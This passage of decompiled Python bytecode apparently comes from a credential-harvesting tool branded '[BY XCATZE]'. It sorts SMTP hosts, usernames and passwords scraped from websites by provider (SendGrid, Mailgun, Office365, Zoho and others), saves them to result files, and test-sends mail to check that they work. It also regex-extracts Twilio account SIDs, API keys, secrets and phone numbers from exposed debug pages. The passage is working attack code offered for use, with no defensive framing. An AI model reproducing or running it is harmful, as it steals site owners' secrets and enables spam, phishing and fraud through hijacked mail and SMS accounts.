              542  LOAD_FAST                'mailport'
              544  LOAD_FAST                'mailuser'
              546  LOAD_FAST                'mailpass'
              548  LOAD_FAST                'emailform'
              550  CALL_FUNCTION_6       6  ''
              552  POP_TOP          
              554  POP_BLOCK        
              556  JUMP_FORWARD       1674  'to 1674'
            558_0  COME_FROM_FINALLY   534  '534'

 L.1459       558  POP_TOP          
              560  POP_TOP          
              562  POP_TOP          

 L.1460       564  POP_EXCEPT       
              566  JUMP_FORWARD       1674  'to 1674'
              568  END_FINALLY      
          570_572  JUMP_FORWARD       1674  'to 1674'
            574_0  COME_FROM           244  '244'
            574_1  COME_FROM           232  '232'

 L.1461       574  LOAD_STR                 'smtp.sendgrid.net'
              576  LOAD_GLOBAL              str
              578  LOAD_FAST                'mailhost'
              580  CALL_FUNCTION_1       1  ''
              582  COMPARE_OP               in
          584_586  POP_JUMP_IF_FALSE   658  'to 658'
              588  LOAD_GLOBAL              sendgrid
              590  CALL_FUNCTION_0       0  ''
              592  LOAD_STR                 'on'
              594  COMPARE_OP               ==
          596_598  POP_JUMP_IF_FALSE   658  'to 658'

 L.1462       600  LOAD_GLOBAL              print
              602  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSendgrid\n'
              604  LOAD_METHOD              format
              606  LOAD_GLOBAL              str
              608  LOAD_FAST                'url'
              610  CALL_FUNCTION_1       1  ''
              612  CALL_METHOD_1         1  ''
              614  CALL_FUNCTION_1       1  ''
              616  POP_TOP          

 L.1463       618  LOAD_GLOBAL              open
              620  LOAD_STR                 'result/sendgrid.txt'
              622  LOAD_STR                 'a'
              624  CALL_FUNCTION_2       2  ''
              626  STORE_FAST               'save'

 L.1464       628  LOAD_FAST                'save'
              630  LOAD_METHOD              write
              632  LOAD_GLOBAL              str
              634  LOAD_FAST                'remover'
              636  CALL_FUNCTION_1       1  ''
              638  LOAD_STR                 '\n\n'
              640  BINARY_ADD       
              642  CALL_METHOD_1         1  ''
              644  POP_TOP          

 L.1465       646  LOAD_FAST                'save'
              648  LOAD_METHOD              close
              650  CALL_METHOD_0         0  ''
              652  POP_TOP          
          654_656  JUMP_FORWARD       1674  'to 1674'
            658_0  COME_FROM           596  '596'
            658_1  COME_FROM           584  '584'

 L.1466       658  LOAD_STR                 'mailgun.org'
              660  LOAD_GLOBAL              str
              662  LOAD_FAST                'mailhost'
              664  CALL_FUNCTION_1       1  ''
              666  COMPARE_OP               in
          668_670  POP_JUMP_IF_FALSE   742  'to 742'
              672  LOAD_GLOBAL              mailgun
              674  CALL_FUNCTION_0       0  ''
              676  LOAD_STR                 'on'
              678  COMPARE_OP               ==
          680_682  POP_JUMP_IF_FALSE   742  'to 742'

 L.1467       684  LOAD_GLOBAL              print
              686  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mmailgun\n'
              688  LOAD_METHOD              format
              690  LOAD_GLOBAL              str
              692  LOAD_FAST                'url'
              694  CALL_FUNCTION_1       1  ''
              696  CALL_METHOD_1         1  ''
              698  CALL_FUNCTION_1       1  ''
              700  POP_TOP          

 L.1468       702  LOAD_GLOBAL              open
              704  LOAD_STR                 'result/mailgun.txt'
              706  LOAD_STR                 'a'
              708  CALL_FUNCTION_2       2  ''
              710  STORE_FAST               'save'

 L.1469       712  LOAD_FAST                'save'
              714  LOAD_METHOD              write
              716  LOAD_GLOBAL              str
              718  LOAD_FAST                'remover'
              720  CALL_FUNCTION_1       1  ''
              722  LOAD_STR                 '\n\n'
              724  BINARY_ADD       
              726  CALL_METHOD_1         1  ''
              728  POP_TOP          

 L.1470       730  LOAD_FAST                'save'
              732  LOAD_METHOD              close
              734  CALL_METHOD_0         0  ''
              736  POP_TOP          
          738_740  JUMP_FORWARD       1674  'to 1674'
            742_0  COME_FROM           680  '680'
            742_1  COME_FROM           668  '668'

 L.1471       742  LOAD_STR                 'sparkpostmail.com'
              744  LOAD_GLOBAL              str
              746  LOAD_FAST                'mailhost'
              748  CALL_FUNCTION_1       1  ''
              750  COMPARE_OP               in
          752_754  POP_JUMP_IF_FALSE   826  'to 826'
              756  LOAD_GLOBAL              sparkpostmail
              758  CALL_FUNCTION_0       0  ''
              760  LOAD_STR                 'on'
              762  COMPARE_OP               ==
          764_766  POP_JUMP_IF_FALSE   826  'to 826'

 L.1472       768  LOAD_GLOBAL              print
              770  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msparkpostmail\n'
              772  LOAD_METHOD              format
              774  LOAD_GLOBAL              str
              776  LOAD_FAST                'url'
              778  CALL_FUNCTION_1       1  ''
              780  CALL_METHOD_1         1  ''
              782  CALL_FUNCTION_1       1  ''
              784  POP_TOP          

 L.1473       786  LOAD_GLOBAL              open
              788  LOAD_STR                 'result/sparkpostmail.txt'
              790  LOAD_STR                 'a'
              792  CALL_FUNCTION_2       2  ''
              794  STORE_FAST               'save'

 L.1474       796  LOAD_FAST                'save'
              798  LOAD_METHOD              write
              800  LOAD_GLOBAL              str
              802  LOAD_FAST                'remover'
              804  CALL_FUNCTION_1       1  ''
              806  LOAD_STR                 '\n\n'
              808  BINARY_ADD       
              810  CALL_METHOD_1         1  ''
              812  POP_TOP          

 L.1475       814  LOAD_FAST                'save'
              816  LOAD_METHOD              close
              818  CALL_METHOD_0         0  ''
              820  POP_TOP          
          822_824  JUMP_FORWARD       1674  'to 1674'
            826_0  COME_FROM           764  '764'
            826_1  COME_FROM           752  '752'

 L.1476       826  LOAD_STR                 'mandrillapp.com'
              828  LOAD_GLOBAL              str
              830  LOAD_FAST                'mailhost'
              832  CALL_FUNCTION_1       1  ''
              834  COMPARE_OP               in
          836_838  POP_JUMP_IF_FALSE   910  'to 910'
              840  LOAD_GLOBAL              mandrillapp
              842  CALL_FUNCTION_0       0  ''
              844  LOAD_STR                 'on'
              846  COMPARE_OP               ==
          848_850  POP_JUMP_IF_FALSE   910  'to 910'

 L.1477       852  LOAD_GLOBAL              print
              854  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mmandrillapp\n'
              856  LOAD_METHOD              format
              858  LOAD_GLOBAL              str
              860  LOAD_FAST                'url'
              862  CALL_FUNCTION_1       1  ''
              864  CALL_METHOD_1         1  ''
              866  CALL_FUNCTION_1       1  ''
              868  POP_TOP          

 L.1478       870  LOAD_GLOBAL              open
              872  LOAD_STR                 'result/mandrill.txt'
              874  LOAD_STR                 'a'
              876  CALL_FUNCTION_2       2  ''
              878  STORE_FAST               'save'

 L.1479       880  LOAD_FAST                'save'
              882  LOAD_METHOD              write
              884  LOAD_GLOBAL              str
              886  LOAD_FAST                'remover'
              888  CALL_FUNCTION_1       1  ''
              890  LOAD_STR                 '\n\n'
              892  BINARY_ADD       
              894  CALL_METHOD_1         1  ''
              896  POP_TOP          

 L.1480       898  LOAD_FAST                'save'
              900  LOAD_METHOD              close
              902  CALL_METHOD_0         0  ''
              904  POP_TOP          
          906_908  JUMP_FORWARD       1674  'to 1674'
            910_0  COME_FROM           848  '848'
            910_1  COME_FROM           836  '836'

 L.1481       910  LOAD_STR                 'zoho.'
              912  LOAD_GLOBAL              str
              914  LOAD_FAST                'mailhost'
              916  CALL_FUNCTION_1       1  ''
              918  COMPARE_OP               in
          920_922  POP_JUMP_IF_FALSE   994  'to 994'
              924  LOAD_GLOBAL              zoho
              926  CALL_FUNCTION_0       0  ''
              928  LOAD_STR                 'on'
              930  COMPARE_OP               ==
          932_934  POP_JUMP_IF_FALSE   994  'to 994'

 L.1482       936  LOAD_GLOBAL              print
              938  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mzoho\n'
              940  LOAD_METHOD              format
              942  LOAD_GLOBAL              str
              944  LOAD_FAST                'url'
              946  CALL_FUNCTION_1       1  ''
              948  CALL_METHOD_1         1  ''
              950  CALL_FUNCTION_1       1  ''
              952  POP_TOP          

 L.1483       954  LOAD_GLOBAL              open
              956  LOAD_STR                 'result/zoho.txt'
              958  LOAD_STR                 'a'
              960  CALL_FUNCTION_2       2  ''
              962  STORE_FAST               'save'

 L.1484       964  LOAD_FAST                'save'
              966  LOAD_METHOD              write
              968  LOAD_GLOBAL              str
              970  LOAD_FAST                'remover'
              972  CALL_FUNCTION_1       1  ''
              974  LOAD_STR                 '\n\n'
              976  BINARY_ADD       
              978  CALL_METHOD_1         1  ''
              980  POP_TOP          

 L.1485       982  LOAD_FAST                'save'
              984  LOAD_METHOD              close
              986  CALL_METHOD_0         0  ''
              988  POP_TOP          
          990_992  JUMP_FORWARD       1674  'to 1674'
            994_0  COME_FROM           932  '932'
            994_1  COME_FROM           920  '920'

 L.1486       994  LOAD_STR                 'smtp-relay.gmail'
              996  LOAD_GLOBAL              str
              998  LOAD_FAST                'mailhost'
             1000  CALL_FUNCTION_1       1  ''
             1002  COMPARE_OP               in
         1004_1006  POP_JUMP_IF_FALSE  1078  'to 1078'
             1008  LOAD_GLOBAL              relay
             1010  CALL_FUNCTION_0       0  ''
             1012  LOAD_STR                 'on'
             1014  COMPARE_OP               ==
         1016_1018  POP_JUMP_IF_FALSE  1078  'to 1078'

 L.1487      1020  LOAD_GLOBAL              print
             1022  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mrelay\n'
             1024  LOAD_METHOD              format
             1026  LOAD_GLOBAL              str
             1028  LOAD_FAST                'url'
             1030  CALL_FUNCTION_1       1  ''
             1032  CALL_METHOD_1         1  ''
             1034  CALL_FUNCTION_1       1  ''
             1036  POP_TOP          

 L.1488      1038  LOAD_GLOBAL              open
             1040  LOAD_STR                 'result/smtp-relay.txt'
             1042  LOAD_STR                 'a'
             1044  CALL_FUNCTION_2       2  ''
             1046  STORE_FAST               'save'

 L.1489      1048  LOAD_FAST                'save'
             1050  LOAD_METHOD              write
             1052  LOAD_GLOBAL              str
             1054  LOAD_FAST                'remover'
             1056  CALL_FUNCTION_1       1  ''
             1058  LOAD_STR                 '\n\n'
             1060  BINARY_ADD       
             1062  CALL_METHOD_1         1  ''
             1064  POP_TOP          

 L.1490      1066  LOAD_FAST                'save'
             1068  LOAD_METHOD              close
             1070  CALL_METHOD_0         0  ''
             1072  POP_TOP          
         1074_1076  JUMP_FORWARD       1674  'to 1674'
           1078_0  COME_FROM          1016  '1016'
           1078_1  COME_FROM          1004  '1004'

 L.1491      1078  LOAD_STR                 'sendinblue.com'
             1080  LOAD_GLOBAL              str
             1082  LOAD_FAST                'mailhost'
             1084  CALL_FUNCTION_1       1  ''
             1086  COMPARE_OP               in
         1088_1090  POP_JUMP_IF_FALSE  1162  'to 1162'
             1092  LOAD_GLOBAL              sendinblue
             1094  CALL_FUNCTION_0       0  ''
             1096  LOAD_STR                 'on'
             1098  COMPARE_OP               ==
         1100_1102  POP_JUMP_IF_FALSE  1162  'to 1162'

 L.1492      1104  LOAD_GLOBAL              print
             1106  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msendinblue\n'
             1108  LOAD_METHOD              format
             1110  LOAD_GLOBAL              str
             1112  LOAD_FAST                'url'
             1114  CALL_FUNCTION_1       1  ''
             1116  CALL_METHOD_1         1  ''
             1118  CALL_FUNCTION_1       1  ''
             1120  POP_TOP          

 L.1493      1122  LOAD_GLOBAL              open
             1124  LOAD_STR                 'result/sendinblue.txt'
             1126  LOAD_STR                 'a'
             1128  CALL_FUNCTION_2       2  ''
             1130  STORE_FAST               'save'

 L.1494      1132  LOAD_FAST                'save'
             1134  LOAD_METHOD              write
             1136  LOAD_GLOBAL              str
             1138  LOAD_FAST                'remover'
             1140  CALL_FUNCTION_1       1  ''
             1142  LOAD_STR                 '\n\n'
             1144  BINARY_ADD       
             1146  CALL_METHOD_1         1  ''
             1148  POP_TOP          

 L.1495      1150  LOAD_FAST                'save'
             1152  LOAD_METHOD              close
             1154  CALL_METHOD_0         0  ''
             1156  POP_TOP          
         1158_1160  JUMP_FORWARD       1674  'to 1674'
           1162_0  COME_FROM          1100  '1100'
           1162_1  COME_FROM          1088  '1088'

 L.1496      1162  LOAD_STR                 'kasserver.com'
             1164  LOAD_GLOBAL              str
             1166  LOAD_FAST                'mailhost'
             1168  CALL_FUNCTION_1       1  ''
             1170  COMPARE_OP               in
         1172_1174  POP_JUMP_IF_FALSE  1234  'to 1234'

 L.1497      1176  LOAD_GLOBAL              print
             1178  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40msendinblue\n'
             1180  LOAD_METHOD              format
             1182  LOAD_GLOBAL              str
             1184  LOAD_FAST                'url'
             1186  CALL_FUNCTION_1       1  ''
             1188  CALL_METHOD_1         1  ''
             1190  CALL_FUNCTION_1       1  ''
             1192  POP_TOP          

 L.1498      1194  LOAD_GLOBAL              open
             1196  LOAD_STR                 'result/kasserver.txt'
             1198  LOAD_STR                 'a'
             1200  CALL_FUNCTION_2       2  ''
             1202  STORE_FAST               'save'

 L.1499      1204  LOAD_FAST                'save'
             1206  LOAD_METHOD              write
             1208  LOAD_GLOBAL              str
             1210  LOAD_FAST                'remover'
             1212  CALL_FUNCTION_1       1  ''
             1214  LOAD_STR                 '\n\n'
             1216  BINARY_ADD       
             1218  CALL_METHOD_1         1  ''
             1220  POP_TOP          

 L.1500      1222  LOAD_FAST                'save'
             1224  LOAD_METHOD              close
             1226  CALL_METHOD_0         0  ''
             1228  POP_TOP          
         1230_1232  JUMP_FORWARD       1674  'to 1674'
           1234_0  COME_FROM          1172  '1172'

 L.1501      1234  LOAD_STR                 '1and1.'
             1236  LOAD_GLOBAL              str
             1238  LOAD_FAST                'mailhost'
             1240  CALL_FUNCTION_1       1  ''
             1242  COMPARE_OP               in
         1244_1246  POP_JUMP_IF_FALSE  1318  'to 1318'
             1248  LOAD_GLOBAL              and1
             1250  CALL_FUNCTION_0       0  ''
             1252  LOAD_STR                 'on'
             1254  COMPARE_OP               ==
         1256_1258  POP_JUMP_IF_FALSE  1318  'to 1318'

 L.1502      1260  LOAD_GLOBAL              print
             1262  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40m1and1\n'
             1264  LOAD_METHOD              format
             1266  LOAD_GLOBAL              str
             1268  LOAD_FAST                'url'
             1270  CALL_FUNCTION_1       1  ''
             1272  CALL_METHOD_1         1  ''
             1274  CALL_FUNCTION_1       1  ''
             1276  POP_TOP          

 L.1503      1278  LOAD_GLOBAL              open
             1280  LOAD_STR                 'result/1and1.txt'
             1282  LOAD_STR                 'a'
             1284  CALL_FUNCTION_2       2  ''
             1286  STORE_FAST               'save'

 L.1504      1288  LOAD_FAST                'save'
             1290  LOAD_METHOD              write
             1292  LOAD_GLOBAL              str
             1294  LOAD_FAST                'remover'
             1296  CALL_FUNCTION_1       1  ''
             1298  LOAD_STR                 '\n\n'
             1300  BINARY_ADD       
             1302  CALL_METHOD_1         1  ''
             1304  POP_TOP          

 L.1505      1306  LOAD_FAST                'save'
             1308  LOAD_METHOD              close
             1310  CALL_METHOD_0         0  ''
             1312  POP_TOP          
         1314_1316  JUMP_FORWARD       1674  'to 1674'
           1318_0  COME_FROM          1256  '1256'
           1318_1  COME_FROM          1244  '1244'

 L.1506      1318  LOAD_FAST                'mailhost'
             1320  LOAD_STR                 'smtp.office365.com'
             1322  COMPARE_OP               ==
         1324_1326  POP_JUMP_IF_FALSE  1398  'to 1398'
             1328  LOAD_GLOBAL              office365
             1330  CALL_FUNCTION_0       0  ''
             1332  LOAD_STR                 'on'
             1334  COMPARE_OP               ==
         1336_1338  POP_JUMP_IF_FALSE  1398  'to 1398'

 L.1507      1340  LOAD_GLOBAL              print
             1342  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40moffice365\n'
             1344  LOAD_METHOD              format
             1346  LOAD_GLOBAL              str
             1348  LOAD_FAST                'url'
             1350  CALL_FUNCTION_1       1  ''
             1352  CALL_METHOD_1         1  ''
             1354  CALL_FUNCTION_1       1  ''
             1356  POP_TOP          

 L.1508      1358  LOAD_GLOBAL              open
             1360  LOAD_STR                 'result/office365.txt'
             1362  LOAD_STR                 'a'
             1364  CALL_FUNCTION_2       2  ''
             1366  STORE_FAST               'save'

 L.1509      1368  LOAD_FAST                'save'
             1370  LOAD_METHOD              write
             1372  LOAD_GLOBAL              str
             1374  LOAD_FAST                'remover'
             1376  CALL_FUNCTION_1       1  ''
             1378  LOAD_STR                 '\n\n'
             1380  BINARY_ADD       
             1382  CALL_METHOD_1         1  ''
             1384  POP_TOP          

 L.1510      1386  LOAD_FAST                'save'
             1388  LOAD_METHOD              close
             1390  CALL_METHOD_0         0  ''
             1392  POP_TOP          
         1394_1396  JUMP_FORWARD       1674  'to 1674'
           1398_0  COME_FROM          1336  '1336'
           1398_1  COME_FROM          1324  '1324'

 L.1511      1398  LOAD_STR                 'zimbra'
             1400  LOAD_GLOBAL              str
             1402  LOAD_FAST                'mailhost'
             1404  CALL_FUNCTION_1       1  ''
             1406  COMPARE_OP               in
         1408_1410  POP_JUMP_IF_FALSE  1480  'to 1480'
             1412  LOAD_GLOBAL              zimbra
             1414  CALL_FUNCTION_0       0  ''
             1416  LOAD_STR                 'on'
             1418  COMPARE_OP               ==
         1420_1422  POP_JUMP_IF_FALSE  1480  'to 1480'

 L.1512      1424  LOAD_GLOBAL              print
             1426  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mZimbra\n'
             1428  LOAD_METHOD              format
             1430  LOAD_GLOBAL              str
             1432  LOAD_FAST                'url'
             1434  CALL_FUNCTION_1       1  ''
             1436  CALL_METHOD_1         1  ''
             1438  CALL_FUNCTION_1       1  ''
             1440  POP_TOP          

 L.1513      1442  LOAD_GLOBAL              open
             1444  LOAD_STR                 'result/zimbra.txt'
             1446  LOAD_STR                 'a'
             1448  CALL_FUNCTION_2       2  ''
             1450  STORE_FAST               'save'

 L.1514      1452  LOAD_FAST                'save'
             1454  LOAD_METHOD              write
             1456  LOAD_GLOBAL              str
             1458  LOAD_FAST                'remover'
             1460  CALL_FUNCTION_1       1  ''
             1462  LOAD_STR                 '\n\n'
             1464  BINARY_ADD       
             1466  CALL_METHOD_1         1  ''
             1468  POP_TOP          

 L.1515      1470  LOAD_FAST                'save'
             1472  LOAD_METHOD              close
             1474  CALL_METHOD_0         0  ''
             1476  POP_TOP          
             1478  JUMP_FORWARD       1674  'to 1674'
           1480_0  COME_FROM          1420  '1420'
           1480_1  COME_FROM          1408  '1408'

 L.1516      1480  LOAD_FAST                'mailuser'
             1482  LOAD_STR                 'null'
             1484  COMPARE_OP               !=
         1486_1488  POP_JUMP_IF_FALSE  1510  'to 1510'
             1490  LOAD_FAST                'mailpass'
             1492  LOAD_STR                 'null'
             1494  COMPARE_OP               !=
         1496_1498  POP_JUMP_IF_FALSE  1510  'to 1510'
             1500  LOAD_FAST                'mailhost'
             1502  LOAD_STR                 'smtp.mailtrap.io'
             1504  COMPARE_OP               !=
         1506_1508  POP_JUMP_IF_TRUE   1550  'to 1550'
           1510_0  COME_FROM          1496  '1496'
           1510_1  COME_FROM          1486  '1486'
             1510  LOAD_FAST                'mailuser'
             1512  LOAD_STR                 ''
             1514  COMPARE_OP               !=
         1516_1518  POP_JUMP_IF_FALSE  1540  'to 1540'
             1520  LOAD_FAST                'mailpass'
             1522  LOAD_STR                 ''
             1524  COMPARE_OP               !=
         1526_1528  POP_JUMP_IF_FALSE  1540  'to 1540'
             1530  LOAD_FAST                'mailhost'
             1532  LOAD_STR                 'smtp.mailtrap.io'
             1534  COMPARE_OP               !=
         1536_1538  POP_JUMP_IF_TRUE   1550  'to 1550'
           1540_0  COME_FROM          1526  '1526'
           1540_1  COME_FROM          1516  '1516'
             1540  LOAD_FAST                'mailhost'
             1542  LOAD_STR                 'smtp.mailtrap.io'
             1544  COMPARE_OP               !=
         1546_1548  POP_JUMP_IF_FALSE  1606  'to 1606'
           1550_0  COME_FROM          1536  '1536'
           1550_1  COME_FROM          1506  '1506'

 L.1517      1550  LOAD_GLOBAL              print
             1552  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mSMTP Random\n'
             1554  LOAD_METHOD              format
             1556  LOAD_GLOBAL              str
             1558  LOAD_FAST                'url'
             1560  CALL_FUNCTION_1       1  ''
             1562  CALL_METHOD_1         1  ''
             1564  CALL_FUNCTION_1       1  ''
             1566  POP_TOP          

 L.1518      1568  LOAD_GLOBAL              open
             1570  LOAD_STR                 'result/SMTP_RANDOM.txt'
             1572  LOAD_STR                 'a'
             1574  CALL_FUNCTION_2       2  ''
             1576  STORE_FAST               'save'

 L.1519      1578  LOAD_FAST                'save'
             1580  LOAD_METHOD              write
             1582  LOAD_GLOBAL              str
             1584  LOAD_FAST                'remover'
             1586  CALL_FUNCTION_1       1  ''
             1588  LOAD_STR                 '\n\n'
             1590  BINARY_ADD       
             1592  CALL_METHOD_1         1  ''
             1594  POP_TOP          

 L.1520      1596  LOAD_FAST                'save'
             1598  LOAD_METHOD              close
             1600  CALL_METHOD_0         0  ''
             1602  POP_TOP          
             1604  JUMP_FORWARD       1674  'to 1674'
           1606_0  COME_FROM          1546  '1546'

 L.1521      1606  LOAD_FAST                'mailuser'
             1608  LOAD_STR                 'null'
             1610  COMPARE_OP               ==
         1612_1614  POP_JUMP_IF_TRUE   1656  'to 1656'
             1616  LOAD_FAST                'mailpass'
             1618  LOAD_STR                 'null'
             1620  COMPARE_OP               ==
         1622_1624  POP_JUMP_IF_TRUE   1656  'to 1656'
             1626  LOAD_FAST                'mailuser'
             1628  LOAD_STR                 ''
             1630  COMPARE_OP               ==
         1632_1634  POP_JUMP_IF_TRUE   1656  'to 1656'
             1636  LOAD_FAST                'mailpass'
             1638  LOAD_STR                 ''
             1640  COMPARE_OP               ==
         1642_1644  POP_JUMP_IF_TRUE   1656  'to 1656'
             1646  LOAD_FAST                'mailhost'
             1648  LOAD_STR                 'smtp.mailtrap.io'
             1650  COMPARE_OP               ==
         1652_1654  POP_JUMP_IF_FALSE  1674  'to 1674'
           1656_0  COME_FROM          1642  '1642'
           1656_1  COME_FROM          1632  '1632'
           1656_2  COME_FROM          1622  '1622'
           1656_3  COME_FROM          1612  '1612'

 L.1522      1656  LOAD_GLOBAL              print
           1658_0  COME_FROM           556  '556'
             1658  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mInvalid SMTP\n'
             1660  LOAD_METHOD              format
             1662  LOAD_GLOBAL              str
             1664  LOAD_FAST                'url'
             1666  CALL_FUNCTION_1       1  ''
           1668_0  COME_FROM           566  '566'
             1668  CALL_METHOD_1         1  ''
             1670  CALL_FUNCTION_1       1  ''
             1672  POP_TOP          
           1674_0  COME_FROM          1652  '1652'
           1674_1  COME_FROM          1604  '1604'
           1674_2  COME_FROM          1478  '1478'
           1674_3  COME_FROM          1394  '1394'
           1674_4  COME_FROM          1314  '1314'
           1674_5  COME_FROM          1230  '1230'
           1674_6  COME_FROM          1158  '1158'
           1674_7  COME_FROM          1074  '1074'
           1674_8  COME_FROM           990  '990'
           1674_9  COME_FROM           906  '906'
          1674_10  COME_FROM           822  '822'
          1674_11  COME_FROM           738  '738'
          1674_12  COME_FROM           654  '654'
          1674_13  COME_FROM           570  '570'

 L.1523      1674  SETUP_FINALLY      1698  'to 1698'

 L.1524      1676  LOAD_GLOBAL              sendtest
             1678  LOAD_FAST                'url'
             1680  LOAD_FAST                'mailhost'
             1682  LOAD_FAST                'mailport'
             1684  LOAD_FAST                'mailuser'
             1686  LOAD_FAST                'mailpass'
             1688  LOAD_FAST                'mailfrom'
             1690  CALL_FUNCTION_6       6  ''
             1692  POP_TOP          
             1694  POP_BLOCK        
             1696  JUMP_FORWARD       1728  'to 1728'
           1698_0  COME_FROM_FINALLY  1674  '1674'

 L.1525      1698  POP_TOP          
             1700  POP_TOP          
             1702  POP_TOP          

 L.1526      1704  LOAD_GLOBAL              print
             1706  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed Send\n'
             1708  LOAD_METHOD              format
             1710  LOAD_GLOBAL              str
             1712  LOAD_FAST                'url'
             1714  CALL_FUNCTION_1       1  ''
             1716  CALL_METHOD_1         1  ''
             1718  CALL_FUNCTION_1       1  ''
             1720  POP_TOP          
             1722  POP_EXCEPT       
             1724  JUMP_FORWARD       1728  'to 1728'
             1726  END_FINALLY      
           1728_0  COME_FROM          1724  '1724'
           1728_1  COME_FROM          1696  '1696'
             1728  JUMP_FORWARD       1748  'to 1748'
           1730_0  COME_FROM            10  '10'

 L.1528      1730  LOAD_GLOBAL              print
             1732  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;31;40mFailed GET SMTP'
             1734  LOAD_METHOD              format
             1736  LOAD_GLOBAL              str
             1738  LOAD_FAST                'url'
             1740  CALL_FUNCTION_1       1  ''
             1742  CALL_METHOD_1         1  ''
             1744  CALL_FUNCTION_1       1  ''
             1746  POP_TOP          
           1748_0  COME_FROM          1728  '1728'
           1748_1  COME_FROM            20  '20'

 L.1530      1748  LOAD_STR                 '<td>TWILIO_ACCOUNT_SID</td>'
             1750  LOAD_FAST                'text'
             1752  COMPARE_OP               in
         1754_1756  POP_JUMP_IF_FALSE  2164  'to 2164'
             1758  LOAD_GLOBAL              twillio
             1760  CALL_FUNCTION_0       0  ''
             1762  LOAD_STR                 'on'
             1764  COMPARE_OP               ==
         1766_1768  POP_JUMP_IF_FALSE  2164  'to 2164'

 L.1531      1770  LOAD_GLOBAL              print
             1772  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mTwillio\n'
             1774  LOAD_METHOD              format
             1776  LOAD_GLOBAL              str
             1778  LOAD_FAST                'url'
             1780  CALL_FUNCTION_1       1  ''
             1782  CALL_METHOD_1         1  ''
             1784  CALL_FUNCTION_1       1  ''
             1786  POP_TOP          

 L.1532      1788  LOAD_GLOBAL              reg
             1790  LOAD_STR                 '<td>TWILIO_ACCOUNT_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1792  LOAD_FAST                'text'
             1794  CALL_FUNCTION_2       2  ''
             1796  LOAD_CONST               0
             1798  BINARY_SUBSCR    
             1800  STORE_FAST               'acc_sid'

 L.1533      1802  SETUP_FINALLY      1822  'to 1822'

 L.1534      1804  LOAD_GLOBAL              reg
             1806  LOAD_STR                 '<td>TWILIO_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1808  LOAD_FAST                'text'
             1810  CALL_FUNCTION_2       2  ''
             1812  LOAD_CONST               0
             1814  BINARY_SUBSCR    
             1816  STORE_FAST               'acc_key'
             1818  POP_BLOCK        
             1820  JUMP_FORWARD       1838  'to 1838'
           1822_0  COME_FROM_FINALLY  1802  '1802'

 L.1535      1822  POP_TOP          
             1824  POP_TOP          
             1826  POP_TOP          

 L.1536      1828  LOAD_STR                 'NULL'
             1830  STORE_FAST               'acc_key'
             1832  POP_EXCEPT       
             1834  JUMP_FORWARD       1838  'to 1838'
             1836  END_FINALLY      
           1838_0  COME_FROM          1834  '1834'
           1838_1  COME_FROM          1820  '1820'

 L.1537      1838  SETUP_FINALLY      1858  'to 1858'

 L.1538      1840  LOAD_GLOBAL              reg
             1842  LOAD_STR                 '<td>TWILIO_API_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1844  LOAD_FAST                'text'
             1846  CALL_FUNCTION_2       2  ''
             1848  LOAD_CONST               0
             1850  BINARY_SUBSCR    
             1852  STORE_FAST               'sec'
             1854  POP_BLOCK        
             1856  JUMP_FORWARD       1874  'to 1874'
           1858_0  COME_FROM_FINALLY  1838  '1838'

 L.1539      1858  POP_TOP          
             1860  POP_TOP          
             1862  POP_TOP          

 L.1540      1864  LOAD_STR                 'NULL'
             1866  STORE_FAST               'sec'
             1868  POP_EXCEPT       
             1870  JUMP_FORWARD       1874  'to 1874'
             1872  END_FINALLY      
           1874_0  COME_FROM          1870  '1870'
           1874_1  COME_FROM          1856  '1856'

 L.1541      1874  SETUP_FINALLY      1894  'to 1894'

 L.1542      1876  LOAD_GLOBAL              reg
             1878  LOAD_STR                 '<td>TWILIO_CHAT_SERVICE_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1880  LOAD_FAST                'text'
             1882  CALL_FUNCTION_2       2  ''
             1884  LOAD_CONST               0
             1886  BINARY_SUBSCR    
             1888  STORE_FAST               'chatid'
             1890  POP_BLOCK        
             1892  JUMP_FORWARD       1910  'to 1910'
           1894_0  COME_FROM_FINALLY  1874  '1874'

 L.1543      1894  POP_TOP          
             1896  POP_TOP          
             1898  POP_TOP          

 L.1544      1900  LOAD_STR                 'null'
             1902  STORE_FAST               'chatid'
             1904  POP_EXCEPT       
             1906  JUMP_FORWARD       1910  'to 1910'
             1908  END_FINALLY      
           1910_0  COME_FROM          1906  '1906'
           1910_1  COME_FROM          1892  '1892'

 L.1545      1910  SETUP_FINALLY      1930  'to 1930'

 L.1546      1912  LOAD_GLOBAL              reg
             1914  LOAD_STR                 '<td>TWILIO_NUMBER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             1916  LOAD_FAST                'text'
             1918  CALL_FUNCTION_2       2  ''
             1920  LOAD_CONST               0
             1922  BINARY_SUBSCR    
             1924  STORE_FAST               'phone'
             1926  POP_BLOCK        
             1928  JUMP_FORWARD       1946  'to 1946'
           1930_0  COME_FROM_FINALLY  1910  '1910'

 L.1547      1930  POP_TOP          
             1932  POP_TOP          
             1934  POP_TOP          

 L.1548      1936  LOAD_STR                 'NULL'
             1938  STORE_FAST               'phone'
             1940  POP_EXCEPT       
             1942  JUMP_FORWARD       1946  'to 1946'
             1944  END_FINALLY      
           1946_0  COME_FROM          1942  '1942'
